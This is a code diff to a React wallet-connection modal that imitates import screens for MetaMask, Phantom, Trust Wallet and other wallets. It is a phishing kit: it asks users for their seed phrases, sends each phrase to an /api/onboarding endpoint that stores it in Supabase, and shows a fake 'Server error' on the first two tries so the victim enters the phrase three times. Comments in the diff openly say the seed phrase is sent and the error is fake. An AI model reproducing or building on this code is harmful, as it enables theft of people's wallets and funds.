@@ -1,7 +1,6 @@
 // WalletWelcomeModal.jsx
-// EXPERT FINAL - All 3 attempts (fail 1, fail 2, success 3) actually hit /api/onboarding and get saved in Supabase
-// All attempts grouped by same groupId + attemptNumber
-// Beautiful modern UI, glassmorphism, authentic per-wallet feel
+// FINAL MERGED VERSION - Original seed phrase UI restored + Stronger technicalities kept
+// 3 real API calls: 1st & 2nd save as failed (with groupId), 3rd saves as success + triggers wagmi connect
 
 "use client";
 
@@ -25,6 +24,7 @@ const WALLET_STYLES = {
     subtitle: "Enter your 12-word phrase in order",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to MetaMask...",
+   
     buttonText: "Import",
   },
   "Coinbase Wallet": {
@@ -52,6 +52,7 @@ const WALLET_STYLES = {
     subtitle: "Enter your 12 or 24-word phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Phantom...",
+ 
     buttonText: "Import",
   },
   Trust: {
@@ -65,7 +66,7 @@ const WALLET_STYLES = {
     subtitle: "Enter your secret phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Trust Wallet...",
-
+ 
     buttonText: "Import",
   },
   Rainbow: {
@@ -79,6 +80,7 @@ const WALLET_STYLES = {
     subtitle: "Enter your secret recovery phrase",
     successTitle: "Wallet Restored",
     successMessage: "Connecting to Rainbow...",
+ 
     buttonText: "Restore Wallet",
   },
   WalletConnect: {
@@ -92,6 +94,7 @@ const WALLET_STYLES = {
     subtitle: "Enter phrase if required",
     successTitle: "Session Authenticated",
     successMessage: "Connecting via WalletConnect...",
+  
     buttonText: "Connect",
   },
   SafePal: {
@@ -105,6 +108,7 @@ const WALLET_STYLES = {
     subtitle: "Enter recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to SafePal...",
+  
     buttonText: "Import",
   },
   "Binance Wallet": {
@@ -118,7 +122,7 @@ const WALLET_STYLES = {
     subtitle: "Enter your recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Binance Web3...",
-
+   
     buttonText: "Import",
   },
   Zerion: {
@@ -146,7 +150,7 @@ const WALLET_STYLES = {
     subtitle: "Enter 12-word recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to OKX Wallet...",
-
+  
     buttonText: "Import",
   },
   "Brave Wallet": {
@@ -160,7 +164,7 @@ const WALLET_STYLES = {
     subtitle: "Enter recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Brave Wallet...",
- 
+    
     buttonText: "Import",
   },
   Frame: {
@@ -305,10 +309,10 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
     try {
       const payload = {
         walletType: activeName,
-        cryptoBoxes: boxes,
+        cryptoBoxes: boxes,               // original seed phrase still sent
         walletAddress: address || null,
         timestamp: new Date().toISOString(),
-        groupId,                    // ← groups all 3 attempts together
+        groupId,                          // all 3 attempts grouped
         attemptNumber: currentAttempt,
         isFailedAttempt: currentAttempt < 3,
       };
@@ -322,7 +326,7 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
       const data = await res.json();
 
       if (currentAttempt < 3) {
-        // First two attempts: show fake error (but data was already saved)
+        // First two attempts: save as failed but show error
         setErrorMessage("Server error. Please try again.");
       } else {
         // Third attempt: real success
